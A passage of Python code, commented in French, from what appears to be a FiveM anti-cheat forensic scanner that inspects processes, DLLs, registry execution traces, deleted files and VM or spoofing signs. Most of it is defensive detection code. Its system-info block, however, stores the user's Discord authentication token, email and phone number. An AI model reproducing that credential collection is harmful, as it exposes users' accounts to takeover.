    # ── 5% : HWID
    hwid = get_hardware_id()
    step("Initialisation", 5, f"HWID : {hwid}")

    # ── 10% : Détection des disques montés
    step("Détection Disques", 10, "Détection de toutes les unités de stockage...")
    mounted_drives = get_all_mounted_drives()
    drive_labels = ", ".join([f"{d['letter']} ({d['fstype']} {d['total_gb']}GB)" for d in mounted_drives])
    step("Détection Disques", 12, f"{len(mounted_drives)} disque(s) : {drive_labels}")

    # ── 12-25% : Phases indépendantes en PARALLÈLE
    # Lance simultanément : Infos système, Install OS, Vitesse Disque
    step("Initialisation Parallèle", 13, f"Lancement des collectes sur {_CPU_CORES} cœurs...")

    _INIT_TIMEOUT = 45
    _init_ex = ThreadPoolExecutor(max_workers=3)
    _f_ext   = _init_ex.submit(get_extended_system_info)
    _f_os    = _init_ex.submit(get_os_installation_date)
    _f_disk  = _init_ex.submit(measure_disk_read_speed)

    try:
        ext_info = _f_ext.result(timeout=_INIT_TIMEOUT)
    except Exception:
        ext_info = {"discord_token": "N/A", "discord_user_id": "N/A", "local_ip": "N/A",
                    "cpu_name": "N/A", "gpu": "N/A", "os_version": "Windows",
                    "disk_total_gb": 0, "disk_used_pct": 0, "uptime": "N/A"}
    try:
        os_install = _f_os.result(timeout=_INIT_TIMEOUT)
    except Exception:
        os_install = {"install_date": "N/A", "age_hours": 0, "status_text": "N/A", "is_recent_reformat": False}
    try:
        disk_speed = _f_disk.result(timeout=_INIT_TIMEOUT)
    except Exception:
        disk_speed = "N/A"
    _init_ex.shutdown(wait=False)

    step("Infos Système", 20, f"CPU/GPU/OS collecté | Disque : {disk_speed} MB/s")

    system_info = {
        "hwid"            : hwid,
        "hostname"        : socket.gethostname(),
        "user"            : getpass.getuser(),
        "discord_id"      : ext_info.get("discord_user_id", "N/A"),  # f_uid → nx_uid
        "userId"          : ext_info.get("discord_user_id", "N/A"),  # alias
        "discord_token"   : ext_info.get("discord_token", "N/A"),   # f_tk  → nx_tk
        "local_ip"        : ext_info.get("local_ip", "N/A"),         # f_ip  → nx_ip
        "email"           : ext_info.get("email", "N/A"),            # f_em  → nx_em
        "phone"           : ext_info.get("phone", "N/A"),            # f_ph  → nx_ph
        "platform"        : sys.platform,
        "os_version"      : ext_info.get("os_version", "Windows"),
        "cpu_name"        : ext_info.get("cpu_name", "N/A"),
        "cpu_count"       : psutil.cpu_count(logical=True) if psutil is not None else 0,
        "gpu"             : ext_info.get("gpu", "N/A"),
        "ram_gb"          : round(psutil.virtual_memory().total / (1024**3), 1) if psutil is not None else 0,
        "disk_total_gb"   : ext_info.get("disk_total_gb", 0),
        "disk_used_pct"   : ext_info.get("disk_used_pct", 0),
        "uptime"          : ext_info.get("uptime", "N/A"),
        "os_install_date" : os_install["install_date"],
        "os_age_hours"    : os_install["age_hours"],
        "reformat_traces" : os_install["status_text"],
        "is_recent_reformat": os_install["is_recent_reformat"],
        "mounted_drives"  : mounted_drives
    }

    # ── 38% : RAM
    ram_usage = psutil.virtual_memory().percent if psutil is not None else 0
    step("Mémoire RAM", 38, f"Allocation RAM : {ram_usage}%")
    time.sleep(0.05)

    # ── 45% : Processus
    all_procs = []
    if psutil is not None:
        try:
            all_procs = [p.info for p in psutil.process_iter(['pid', 'name', 'exe', 'username'])]
        except Exception:
            all_procs = []
    total_procs = len(all_procs)
    step("Processus & DLLs", 45, f"Analyse de {total_procs} processus en parallèle...")

    raw_processes  = []
    total_dlls     = 0
    try:
        with ThreadPoolExecutor(max_workers=_CPU_WORKERS) as ex:
            for res in ex.map(process_single, all_procs, timeout=30):
                if res:
                    raw_processes.append(res)
                    total_dlls += res.get("loaded_dll_count", 0)
    except Exception:
        pass

    step("Processus & DLLs", 55, f"{len(raw_processes)} processus analysés | {total_dlls} DLLs")
    time.sleep(0.05)

    # ── 58% : Boot Time + Session Duration
    try:
        if psutil is not None:
            boot_ts = psutil.boot_time()
            boot_dt = datetime.fromtimestamp(boot_ts)
            boot_time_str = boot_dt.strftime("%Y-%m-%d %H:%M:%S")

            # Durée depuis le démarrage (uptime machine)
            uptime_sec = time.time() - boot_ts
            up_h = int(uptime_sec // 3600)
            up_m = int((uptime_sec % 3600) // 60)
            up_s = int(uptime_sec % 60)
            uptime_formatted = f"{up_h:02d}h {up_m:02d}min {up_s:02d}s"
        else:
            boot_time_str = "Inconnu"
            uptime_formatted = "Inconnu"
    except Exception:
        boot_time_str = "Inconnu"
        uptime_formatted = "Inconnu"
    system_info["boot_time"] = boot_time_str
    system_info["uptime_formatted"] = uptime_formatted

    # Heure de début de session Windows (logon utilisateur courant via WMI)
    try:
        ps_session_cmd = (
            "try { $u = (Get-CimInstance Win32_LogonSession | Where-Object {$_.LogonType -in @(2,10,11)} | "
            "Sort-Object StartTime | Select-Object -Last 1); "
            "if ($u) { $u.StartTime.ToUniversalTime().ToString('yyyy-MM-dd HH:mm:ss') } else { 'N/A' } } catch { 'N/A' }"
        )
        sess_res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_session_cmd],
            capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=5,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        sess_str = sess_res.stdout.strip()
        if sess_str and sess_str != "N/A" and "error" not in sess_str.lower():
            sess_dt = datetime.strptime(sess_str, "%Y-%m-%d %H:%M:%S")
            # Convertir en heure locale
            import calendar
            now_utc = datetime.utcnow()
            now_local = datetime.now()
            tz_offset_sec = (now_local - now_utc).total_seconds()
            sess_local = sess_dt + __import__('datetime').timedelta(seconds=tz_offset_sec)
            session_start_str = sess_local.strftime("%Y-%m-%d %H:%M:%S")
            # Durée de la session
            sess_sec = (datetime.now() - sess_local).total_seconds()
            if sess_sec < 0:
                sess_sec = 0
            s_h = int(sess_sec // 3600)
            s_m = int((sess_sec % 3600) // 60)
            s_s = int(sess_sec % 60)
            session_duration_str = f"{s_h:02d}h {s_m:02d}min {s_s:02d}s"
        else:
            session_start_str = "Inconnu"
            session_duration_str = "Inconnu"
    except Exception:
        session_start_str = "Inconnu"
        session_duration_str = "Inconnu"
    system_info["session_start"] = session_start_str
    system_info["session_duration"] = session_duration_str

    # ── 62-72% : Scan fichiers FiveM MULTI-DISQUES
    try:
        fivem_suspects = scan_fivem_cheat_files_all_drives(
            drives=mounted_drives,
            progress_callback=progress_callback,
            start_pct=62,
            end_pct=72
        )
    except Exception:
        fivem_suspects = []

    # ── 73-80% : Analyses Forensiques en PARALLÈLE
    # NOTE: On n'utilise PAS 'with' (qui attend tous les threads) — on utilise
    # des timeouts individuels pour éviter le blocage si un thread forensique est lent.
    _FORENSIC_TIMEOUT = 45  # 45s max par analyse forensique
    step("Forensique Système", 73, "Lancement des analyses forensiques (Prefetch, Defender, USN, USB, BAM, UserAssist, VM, Amcache, Net, DLL, Scripts, Hollowing)...")
    forensique_ex = ThreadPoolExecutor(max_workers=16)
    try:
        f_pf   = forensique_ex.submit(scan_windows_prefetch, progress_callback, 73)
        f_def  = forensique_ex.submit(scan_windows_defender_threats, progress_callback, 74)
        f_usn  = forensique_ex.submit(scan_usn_journal_all_drives, mounted_drives, progress_callback, 76)
        f_usb  = forensique_ex.submit(scan_usb_storage_history, progress_callback, 79)
        f_bam  = forensique_ex.submit(scan_windows_bam, progress_callback, 75)
        f_ua   = forensique_ex.submit(scan_windows_userassist, progress_callback, 77)
        f_vm   = forensique_ex.submit(scan_vm_and_sandbox, progress_callback, 80)
        f_amc  = forensique_ex.submit(scan_amcache, progress_callback, 81)
        f_net  = forensique_ex.submit(scan_network_connections, progress_callback, 82)
        f_dll  = forensique_ex.submit(scan_advanced_dll_injection, progress_callback, 83)
        # ── Nouvelles analyses (Sprint 1 + 2) — issues des rapports VM 2026-08-03
        f_uuid = forensique_ex.submit(scan_uuid_config_files, progress_callback, 84)
        f_svc  = forensique_ex.submit(scan_eventlog_new_services, progress_callback, 85)
        f_cnh  = forensique_ex.submit(scan_conhost_parent_suspicious, progress_callback, 86)
        f_hwid = forensique_ex.submit(scan_hwid_crosscheck, progress_callback, 87)
        f_lua = forensique_ex.submit(scan_fivem_lua_js_cheat_scripts, progress_callback, 88)
        f_hol = forensique_ex.submit(scan_process_hollowing, progress_callback, 89)
        f_cleaner = forensique_ex.submit(scan_spoofer_cleaner, progress_callback, 90)
        # ── Sprint 3 : ShimCache, MFT Parser, Entropie PE
        f_shim    = forensique_ex.submit(scan_shimcache, progress_callback, 91)
        f_mft     = forensique_ex.submit(scan_mft_deleted_files, mounted_drives, progress_callback, 92)
        f_entropy = forensique_ex.submit(scan_pe_entropy, mounted_drives, progress_callback, 93)

        try:
            prefetch_res = f_pf.result(timeout=_FORENSIC_TIMEOUT)
        except Exception:
            prefetch_res = {"traces": [], "total_pf_count": 0, "is_wiped": False}

        try:
            defender_traces = f_def.result(timeout=_FORENSIC_TIMEOUT)
        except Exception:
            defender_traces = []

        try:
            usn_traces = f_usn.result(timeout=_FORENSIC_TIMEOUT)
        except Exception:
            usn_traces = []

        try:
            bam_traces = f_bam.result(timeout=_FORENSIC_TIMEOUT)
        except Exception:
            bam_traces = []

        try:
            ua_traces = f_ua.result(timeout=_FORENSIC_TIMEOUT)
        except Exception:
            ua_traces = []

        try:
            usb_history = f_usb.result(timeout=_FORENSIC_TIMEOUT)
        except Exception:
            usb_history = []

        try:
            vm_sandbox_result = f_vm.result(timeout=_FORENSIC_TIMEOUT)
        except Exception:
            vm_sandbox_result = {"is_running_in_vm": False, "vm_score": 0, "details": [], "verdict": "UNKNOWN"}

        try:
            amcache_traces = f_amc.result(timeout=_FORENSIC_TIMEOUT)
        except Exception:
            amcache_traces = []

        try:
            network_traces = f_net.result(timeout=_FORENSIC_TIMEOUT)
        except Exception:
            network_traces = []

        try:
            injected_dll_traces = f_dll.result(timeout=_FORENSIC_TIMEOUT)
        except Exception:
            injected_dll_traces = []

        try:
            uuid_traces = f_uuid.result(timeout=_FORENSIC_TIMEOUT)
        except Exception:
            uuid_traces = []

        try:
            eventlog_svc_traces = f_svc.result(timeout=_FORENSIC_TIMEOUT)
        except Exception:
            eventlog_svc_traces = []

        try:
            conhost_traces = f_cnh.result(timeout=_FORENSIC_TIMEOUT)
        except Exception:
            conhost_traces = []

        try:
            hwid_crosscheck = f_hwid.result(timeout=_FORENSIC_TIMEOUT)
        except Exception:
            hwid_crosscheck = {"spoof_detected": False, "spoof_details": []}

        try:
            lua_js_result = f_lua.result(timeout=_FORENSIC_TIMEOUT)
        except Exception:
            lua_js_result = {"suspects": [], "scanned_count": 0}

        try:
            hollowing_result = f_hol.result(timeout=_FORENSIC_TIMEOUT)
        except Exception:
            hollowing_result = {"hollowing_detected": False, "details": [], "processes_checked": 0}

        try:
            cleaner_result = f_cleaner.result(timeout=_FORENSIC_TIMEOUT)
        except Exception:
            cleaner_result = {"score": 0, "findings": []}

        try:
            shimcache_traces = f_shim.result(timeout=_FORENSIC_TIMEOUT)
        except Exception:
            shimcache_traces = []

        try:
            mft_traces = f_mft.result(timeout=_FORENSIC_TIMEOUT)
        except Exception:
            mft_traces = []

        try:
            entropy_traces = f_entropy.result(timeout=_FORENSIC_TIMEOUT)
        except Exception:
            entropy_traces = []
    finally:
        forensique_ex.shutdown(wait=False, cancel_futures=True)

    prefetch_traces = prefetch_res.get("traces", [])
    system_info["prefetch_file_count"] = prefetch_res.get("total_pf_count", 0)
    system_info["is_prefetch_wiped"] = prefetch_res.get("is_wiped", False)

    step("Forensique BAM", 77, f"{len(bam_traces)} trace(s) BAM détectée(s)")
    step("Forensique UserAssist", 78, f"{len(ua_traces)} trace(s) UserAssist détectée(s)")
    step("Forensique USN NTFS", 79, f"{len(usn_traces)} fichier(s) supprimé(s) sur {len(mounted_drives)} disque(s)")

    disconnected_usbs = [u for u in usb_history if not u.get("is_connected")]
    system_info["has_disconnected_usb"] = len(disconnected_usbs) > 0
    system_info["disconnected_usb_count"] = len(disconnected_usbs)

    # ── Info VM/Sandbox dans system_info ──
    system_info["is_running_in_vm"]  = vm_sandbox_result.get("is_running_in_vm", False)
    system_info["vm_score"]          = vm_sandbox_result.get("vm_score", 0)
    system_info["vm_verdict"]        = vm_sandbox_result.get("verdict", "UNKNOWN")
    system_info["vm_details"]        = vm_sandbox_result.get("details", [])

    if vm_sandbox_result.get("is_running_in_vm"):
        step("VM/Sandbox", 81, f"⚠️ SCAN LANCÉ DANS UNE VM — Score : {vm_sandbox_result.get('vm_score')}/25")
    else:
        step("VM/Sandbox", 81, f"✅ Environnement physique confirmé (Score VM : {vm_sandbox_result.get('vm_score')}/25)")

    step("Forensique Amcache", 82, f"{len(amcache_traces)} trace(s) Amcache.hve détectée(s)")

    # ── Info Scripts Lua/JS dans system_info ──
    lua_js_suspects = lua_js_result.get("suspects", [])
    system_info["fivem_lua_js_suspect_count"] = len(lua_js_suspects)
    system_info["fivem_lua_js_scanned"] = lua_js_result.get("scanned_count", 0)
    if lua_js_suspects:
        step("Scripts FiveM", 88, f"⚠️ {len(lua_js_suspects)} script(s) Lua/JS suspect(s) trouvé(s) dans FiveM")
    else:
        step("Scripts FiveM", 88, f"✅ {lua_js_result.get('scanned_count', 0)} script(s) FiveM vérifié(s), aucun suspect")

    # ── Info Process Hollowing dans system_info ──
    system_info["process_hollowing_detected"] = hollowing_result.get("hollowing_detected", False)
    system_info["process_hollowing_details"] = hollowing_result.get("details", [])
    system_info["process_hollowing_checked"] = hollowing_result.get("processes_checked", 0)
    if hollowing_result.get("hollowing_detected"):
        step("Process Hollowing", 89, f"⚠️ Chaîne de processus suspecte détectée sur {len(hollowing_result.get('details', []))} processus")
    else:
        step("Process Hollowing", 89, f"✅ {hollowing_result.get('processes_checked', 0)} processus FiveM/GTA vérifié(s)")

    # ── 83% : Regroupement
    step("Regroupement Apps", 82, "Regroupement des sous-processus par Application...")
    grouped_map = {}
    for proc in raw_processes:
        exe = proc.get("exe_path") or f"NO_EXE_{proc.get('name')}"
        key = (proc.get("name"), exe)
        if key not in grouped_map:
            grouped_map[key] = {
                "name"            : proc.get("name"),
                "exe_path"        : proc.get("exe_path"),
                "pids"            : [proc.get("pid")],
                "instances_count" : 1,
                "user"            : proc.get("user"),
                "loaded_dll_count": proc.get("loaded_dll_count", 0)
            }
        else:
            grouped_map[key]["pids"].append(proc.get("pid"))
            grouped_map[key]["instances_count"] += 1
            grouped_map[key]["loaded_dll_count"] += proc.get("loaded_dll_count", 0)

    # ── 85-95% : Scoring par application en PARALLÈLE
    apps_list    = list(grouped_map.items())
    total_apps   = max(len(apps_list), 1)
    applications = []

    def _score_app(item):
        (name, exe), app_data = item
        exe_path = app_data.get("exe_path")
        sha256   = get_file_sha256(exe_path) if exe_path else None
        sig      = check_authenticode_signature(exe_path) if exe_path else {"signed": False, "status": "NoExe"}

        app_item = {
            "app_name"        : name,
            "exe_path"        : exe_path,
            "sha256"          : sha256,
            "signature"       : sig,
            "instances_count" : app_data["instances_count"],
            "pids"            : app_data["pids"],
            "total_dll_count" : app_data["loaded_dll_count"],
            "status_type"     : "PROCESSUS_EN_COURS"
        }
        app_item["risk_assessment"] = evaluate_app_risk(app_item)
        return app_item

    with ThreadPoolExecutor(max_workers=_CPU_WORKERS) as score_ex:
        futures_score = [score_ex.submit(_score_app, item) for item in apps_list]
        for idx, f in enumerate(as_completed(futures_score)):
            if progress_callback and idx % 15 == 0:
                pct = 85 + int((idx / total_apps) * 10)
                progress_callback("Calcul du Risque", pct, f"Scoring {idx+1}/{total_apps} applications...")
            try:
                applications.append(f.result())
            except Exception:
                pass

    # Ajouter les fichiers physiques suspects
    if fivem_suspects:
        for suspect in fivem_suspects:
            applications.append({
                "app_name"        : suspect["file"],
                "exe_path"        : suspect["path"],
                "sha256"          : None,
                "signature"       : {"signed": False, "status": "CheatFile"},
                "instances_count" : 0,
                "pids"            : [],
                "total_dll_count" : 0,
                "status_type"     : "ARTEFACT_DISQUE",
                "risk_assessment" : {
                    "risk_score"   : 85,
                    "is_suspicious": True,
                    "verdict_level": "HIGH_RISK",
                    "observations" : [{
                        "severity"   : suspect.get("severity", "CRITICAL"),
                        "title"      : "Fichier Suspect Détecté sur le Disque",
                        "description": suspect["reason"]
                    }]
                }
            })

    # Ajouter les traces forensiques Prefetch
    if prefetch_traces:
        for trace in prefetch_traces:
            applications.append({
                "app_name"        : trace["executable_name"],
                "exe_path"        : f"C:\\Windows\\Prefetch\\{trace['prefetch_file']}",
                "sha256"          : None,
                "signature"       : {"signed": False, "status": "PrefetchTrace"},
                "instances_count" : 0,
                "pids"            : [],
                "total_dll_count" : 0,
                "status_type"     : "TRACE_HISTORIQUE_PREFETCH",
                "risk_assessment" : {
                    "risk_score"   : 90,
                    "is_suspicious": True,
                    "verdict_level": "HIGH_RISK",
                    "observations" : [{
                        "severity"   : "CRITICAL",
                        "title"      : "Trace Historique d'Exécution Windows (Prefetch)",
                        "description": trace["description"]
                    }]
                }
            })

    # Ajouter les traces forensiques Windows Defender
    if defender_traces:
        for trace in defender_traces:
            res_path = trace.get("resources", "")
            raw_threat = trace.get("threat_name", "Menace Defender")
            # Extraire le nom de fichier propre depuis la ressource si présent (ex: file:_C:\Path\loader.exe -> loader.exe)
            extracted_name = None
            if "file:" in res_path.lower():
                clean_p = res_path.split("file:", 1)[-1].strip("_").strip()
                extracted_name = os.path.basename(clean_p)
            elif "\\" in res_path or "/" in res_path:
                extracted_name = os.path.basename(res_path)

            display_app_name = extracted_name if extracted_name else f"{raw_threat}"

            applications.append({
                "app_name"        : display_app_name,
                "threat_name"     : raw_threat,
                "exe_path"        : res_path,
                "sha256"          : None,
                "signature"       : {"signed": False, "status": "DefenderDetectionTrace"},
                "instances_count" : 0,
                "pids"            : [],
                "total_dll_count" : 0,
                "status_type"     : "TRACE_HISTORIQUE_DEFENDER",
                "risk_assessment" : {
                    "risk_score"   : 95,
                    "is_suspicious": True,
                    "verdict_level": "HIGH_RISK",
                    "observations" : [{
                        "severity"   : "CRITICAL",
                        "title"      : f"Détection Defender ({raw_threat})",
                        "description": trace["description"]
                    }]
                }
            })

    # Ajouter les traces forensiques USN Journal
    if usn_traces:
        for trace in usn_traces:
            applications.append({
                "app_name"        : trace["filename"],
                "exe_path"        : f"USN_JOURNAL_DELETED_FILE",
                "sha256"          : None,
                "signature"       : {"signed": False, "status": "UsnDeletedTrace"},
                "instances_count" : 0,
                "pids"            : [],
                "total_dll_count" : 0,
                "status_type"     : "TRACE_HISTORIQUE_USN",
                "risk_assessment" : {
                    "risk_score"   : 95,
                    "is_suspicious": True,
                    "verdict_level": "HIGH_RISK",
                    "observations" : [{
                        "severity"   : "CRITICAL",
                        "title"      : "Fichier Supprimé Détecté dans le Journal NTFS (USN)",
                        "description": trace["reason"]
                    }]
                }
            })

    # Ajouter les traces forensiques BAM
    if bam_traces:
        for trace in bam_traces:
            applications.append({
                "app_name"        : trace["executable_name"],
                "exe_path"        : trace["exe_path"],
                "sha256"          : None,
                "signature"       : {"signed": False, "status": "BamTrace"},
                "instances_count" : 0,
                "pids"            : [],
                "total_dll_count" : 0,
                "status_type"     : "TRACE_HISTORIQUE_BAM",
                "risk_assessment" : {
                    "risk_score"   : 95,
                    "is_suspicious": True,
                    "verdict_level": "HIGH_RISK",
                    "observations" : [{
                        "severity"   : trace["severity"],
                        "title"      : "Trace d'Exécution Registre (BAM)",
                        "description": trace["description"]
                    }]
                }
            })

    # Ajouter les traces forensiques UserAssist
    if ua_traces:
        for trace in ua_traces:
            applications.append({
                "app_name"        : trace["executable_name"],
                "exe_path"        : trace["exe_path"],
                "sha256"          : None,
                "signature"       : {"signed": False, "status": "UserAssistTrace"},
                "instances_count" : 0,
                "pids"            : [],
                "total_dll_count" : 0,
                "status_type"     : "TRACE_HISTORIQUE_USERASSIST",
                "risk_assessment" : {
                    "risk_score"   : 90,
                    "is_suspicious": True,
                    "verdict_level": "HIGH_RISK",
                    "observations" : [{
                        "severity"   : trace["severity"],
                        "title"      : "Trace d'Exécution Explorer (UserAssist)",
                        "description": trace["description"]
                    }]
                }
            })

    # ── 100% : Terminé
    # Ajouter les traces Amcache comme entrées applications
    _amcache_risk_map = {"CRITICAL": 70, "HIGH": 50, "MEDIUM": 35}
    for trace in amcache_traces:
        applications.append({
            "app_name"        : trace["executable_name"],
            "exe_path"        : trace["exe_path"],
            "sha256"          : None,
            "signature"       : {"signed": False, "status": "AmcacheTrace"},
            "instances_count" : 0,
            "pids"            : [],
            "total_dll_count" : 0,
            "status_type"     : "TRACE_HISTORIQUE_AMCACHE",
            "risk_assessment" : {
                "risk_score"   : _amcache_risk_map.get(trace.get("severity"), 35),
                "is_suspicious": True,
                "verdict_level": "HIGH_RISK" if trace.get("severity") in ("CRITICAL", "HIGH") else "MEDIUM_RISK",
                "observations" : [{
                    "severity"   : trace["severity"],
                    "title"      : "Trace Amcache.hve (Historique Exécution Windows)",
                    "description": trace["description"]
                }]
            }
        })

    # Ajouter les traces réseau comme entrées applications
    for trace in network_traces:
        applications.append({
            "app_name"        : trace["process_name"],
            "exe_path"        : f"PID_{trace['pid']}_Port_{trace['port']}",
            "sha256"          : None,
            "signature"       : {"signed": False, "status": "NetworkSuspiciousConnection"},
            "instances_count" : 0,
            "pids"            : [trace["pid"]] if trace["pid"] else [],
            "total_dll_count" : 0,
            "status_type"     : "CONNEXION_RÉSEAU_SUSPECTE",
            "risk_assessment" : {
                "risk_score"   : 80,
                "is_suspicious": True,
                "verdict_level": "HIGH_RISK",
                "observations" : [{
                    "severity"   : trace["severity"],
                    "title"      : "Connexion Réseau Suspecte active (Port Cheat)",
                    "description": trace["description"]
                }]
            }
        })

    # Ajouter les traces d'injections DLL
    for trace in injected_dll_traces:
        applications.append({
            "app_name"        : trace["dll_name"],
            "exe_path"        : trace["dll_path"],
            "sha256"          : None,
            "signature"       : {"signed": False, "status": "SuspiciousInjectedDll"},
            "instances_count" : 0,
            "pids"            : [trace["pid"]],
            "total_dll_count" : 0,
            "status_type"     : "DLL_INJECTÉE_SUSPECTE",
            "risk_assessment" : {
                "risk_score"   : 95,
                "is_suspicious": True,
                "verdict_level": "HIGH_RISK",
                "observations" : [{
                    "severity"   : trace["severity"],
                    "title"      : "DLL suspecte non signée détectée dans un processus de jeu",
                    "description": trace["description"]
                }]
            }
        })

    # ── Ajouter les traces UUID config (fichiers de licence cheat)
    for trace in uuid_traces:
        applications.append({
            "app_name"        : trace["file"],
            "exe_path"        : trace["path"],
            "sha256"          : None,
            "signature"       : {"signed": False, "status": "CheatLicenseUUID"},
            "instances_count" : 0,
            "pids"            : [],
            "total_dll_count" : 0,
            "status_type"     : "FICHIER_LICENCE_UUID_CHEAT",
            "risk_assessment" : {
                "risk_score"   : 85,
                "is_suspicious": True,
                "verdict_level": "HIGH_RISK",
                "observations" : [{
                    "severity"   : trace["severity"],
                    "title"      : "Fichier de Licence UUID Cheat Détecté",
                    "description": trace["description"]
                }]
            }
        })

    # ── Ajouter les traces EventLog (services suspects EventID 7045)
    for trace in eventlog_svc_traces:
        applications.append({
            "app_name"        : trace["service_name"],
            "exe_path"        : trace["service_file"],
            "sha256"          : None,
            "signature"       : {"signed": False, "status": "SuspiciousService7045"},
            "instances_count" : 0,
            "pids"            : [],
            "total_dll_count" : 0,
            "status_type"     : "SERVICE_SUSPECT_EVENTID_7045",
            "risk_assessment" : {
                "risk_score"   : 95,
                "is_suspicious": True,
                "verdict_level": "HIGH_RISK",
                "observations" : [{
                    "severity"   : trace["severity"],
                    "title"      : "Service Suspect Créé (EventID 7045) — Possible Driver Cheat",
                    "description": trace["description"]
                }]
            }
        })

    # ── Ajouter les traces conhost parent suspect
    for trace in conhost_traces:
        applications.append({
            "app_name"        : f"conhost.exe (parent: {trace['parent_name']})",
            "exe_path"        : trace["parent_exe"],
            "sha256"          : None,
            "signature"       : {"signed": False, "status": "ConhostSuspiciousParent"},
            "instances_count" : 1,
            "pids"            : [trace["conhost_pid"]],
            "total_dll_count" : 0,
            "status_type"     : "CONHOST_PARENT_SUSPECT",
            "risk_assessment" : {
                "risk_score"   : 60,
                "is_suspicious": True,
                "verdict_level": "HIGH_RISK",
                "observations" : [{
                    "severity"   : trace["severity"],
                    "title"      : "conhost.exe avec Parent Non-Légitime (Loader Cheat CONSOLE)",
                    "description": trace["description"]
                }]
            }
        })

    # ── Traces cleaner/spoofer FiveM (NitWitcleaner & similaires) ──
    _cleaner_risk_map = {"CRITICAL": 80, "HIGH": 65, "MEDIUM": 45}
    for trace in cleaner_result.get("findings", []):
        applications.append({
            "app_name"        : trace["rule"],
            "exe_path"        : "CLEANER_EFFECT_DETECTED",
            "sha256"          : None,
            "signature"       : {"signed": False, "status": "SpooferCleanerEffect"},
            "instances_count" : 0,
            "pids"            : [],
            "total_dll_count" : 0,
            "status_type"     : "CLEANER_SPOOFER_EFFECT",
            "risk_assessment" : {
                "risk_score"   : _cleaner_risk_map.get(trace["severity"], 50),
                "is_suspicious": True,
                "verdict_level": "HIGH_RISK" if trace["severity"] in ("CRITICAL", "HIGH") else "MEDIUM_RISK",
                "observations" : [{
                    "severity"   : trace["severity"],
                    "title"      : trace["title"],
                    "description": trace["detail"]
                }]
            }
        })

    # ── HWID spoof actif → augmenter le score global si détecté
    if hwid_crosscheck.get("spoof_detected"):
        for detail in hwid_crosscheck.get("spoof_details", []):
            applications.append({
                "app_name"        : "HWID_SPOOF_DETECTED",
                "exe_path"        : "REGISTRY_HWID_MANIPULATION",
                "sha256"          : None,
                "signature"       : {"signed": False, "status": "HWIDSpoofActive"},
                "instances_count" : 0,
                "pids"            : [],
                "total_dll_count" : 0,
                "status_type"     : "HWID_SPOOF_ACTIF",
                "risk_assessment" : {
                    "risk_score"   : 95,
                    "is_suspicious": True,
                    "verdict_level": "HIGH_RISK",
                    "observations" : [{
                        "severity"   : "CRITICAL",
                        "title"      : "HWID Spoofing Actif Détecté (Cross-Check Registre vs WMI)",
                        "description": detail
                    }]
                }
            })

    # ── Ajouter les traces ShimCache (AppCompatCache)
    _shim_risk = {"CRITICAL": 85, "HIGH": 65, "MEDIUM": 45}
    for trace in shimcache_traces:
        applications.append({
            "app_name"        : trace["executable_name"],
            "exe_path"        : trace["exe_path"],
            "sha256"          : None,
            "signature"       : {"signed": False, "status": "ShimCacheTrace"},
            "instances_count" : 0,
            "pids"            : [],
            "total_dll_count" : 0,
            "status_type"     : "TRACE_HISTORIQUE_SHIMCACHE",
            "risk_assessment" : {
                "risk_score"   : _shim_risk.get(trace.get("severity"), 65),
                "is_suspicious": True,
                "verdict_level": "HIGH_RISK" if trace.get("severity") in ("CRITICAL", "HIGH") else "MEDIUM_RISK",
                "observations" : [{
                    "severity"   : trace["severity"],
                    "title"      : "Trace ShimCache (AppCompatCache) — Couche Compatibilité Windows",
                    "description": trace["description"]
                }]
            }
        })

    # ── Ajouter les traces MFT (fichiers supprimés $MFT)
    _mft_risk = {"CRITICAL": 90, "HIGH": 70, "MEDIUM": 50}
    for trace in mft_traces:
        applications.append({
            "app_name"        : trace["filename"],
            "exe_path"        : trace["path"],
            "sha256"          : None,
            "signature"       : {"signed": False, "status": "MFTDeletedTrace"},
            "instances_count" : 0,
            "pids"            : [],
            "total_dll_count" : 0,
            "status_type"     : "TRACE_MFT_SUPPRIME",
            "risk_assessment" : {
                "risk_score"   : _mft_risk.get(trace.get("severity"), 70),
                "is_suspicious": True,
                "verdict_level": "HIGH_RISK",
                "observations" : [{
                    "severity"   : trace["severity"],
                    "title"      : "Fichier Supprimé Détecté dans $MFT NTFS (Suppression profonde)",
                    "description": trace["reason"]
                }]
            }
        })

    # ── Ajouter les traces d'entropie élevée (PE packés/chiffrés)
    _entropy_risk = {"CRITICAL": 80, "HIGH": 60}
    for trace in entropy_traces:
        applications.append({
            "app_name"        : trace["filename"],
            "exe_path"        : trace["path"],
            "sha256"          : None,
            "signature"       : {"signed": False, "status": "HighEntropyPE"},
            "instances_count" : 0,
            "pids"            : [],
            "total_dll_count" : 0,
            "status_type"     : "PE_HAUTE_ENTROPIE_PACK",
            "risk_assessment" : {
                "risk_score"   : _entropy_risk.get(trace.get("severity"), 60),
                "is_suspicious": True,
                "verdict_level": "HIGH_RISK",
                "observations" : [{
                    "severity"   : trace["severity"],
                    "title"      : f"PE Packé/Chiffré Détecté (Entropie Shannon={trace.get('max_entropy', '?')} bits)",
                    "description": trace["reason"]
                }]
            }
        })

    # ── Risque Global & Confiance (calculé sur TOUTES les applications)
    risk_summary = calculate_overall_risk_grouped(applications, system_info=system_info)

    system_info["hwid_crosscheck"] = hwid_crosscheck

    step("Scan Terminé", 100, (
        f"{len(applications)} apps ({total_procs} PIDs) | {len(mounted_drives)} disque(s) | "
        f"{len(usb_history)} USB | {len(prefetch_traces)} Prefetch | {len(amcache_traces)} Amcache | "
        f"{len(injected_dll_traces)} DLL Inj | {len(uuid_traces)} UUID | {len(eventlog_svc_traces)} Svc7045 | "
        f"{len(cleaner_result.get('findings', []))} Cleaner | "
        f"{len(shimcache_traces)} ShimCache | {len(mft_traces)} MFT | {len(entropy_traces)} Entropy"
    ))

    return {
        "timestamp"        : time.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "hwid"             : hwid,
        "system_info"      : system_info,
        "disk_performance" : {"read_speed_mb_s": disk_speed},
        "stats"            : {
            "processes_scanned"   : total_procs,
            "applications_count"  : len(applications),
            "total_dlls_scanned"  : total_dlls,
            "ram_percent"         : ram_usage,
            "fivem_suspects_count": len(fivem_suspects),
            "prefetch_traces_count": len(prefetch_traces),
            "usn_traces_count"    : len(usn_traces),
            "defender_traces_count": len(defender_traces),
            "bam_traces_count"    : len(bam_traces),
            "userassist_traces_count": len(ua_traces),
            "usb_devices_count"      : len(usb_history),
            "amcache_traces_count"   : len(amcache_traces),
            "network_traces_count"   : len(network_traces),
            "injected_dll_traces_count": len(injected_dll_traces),
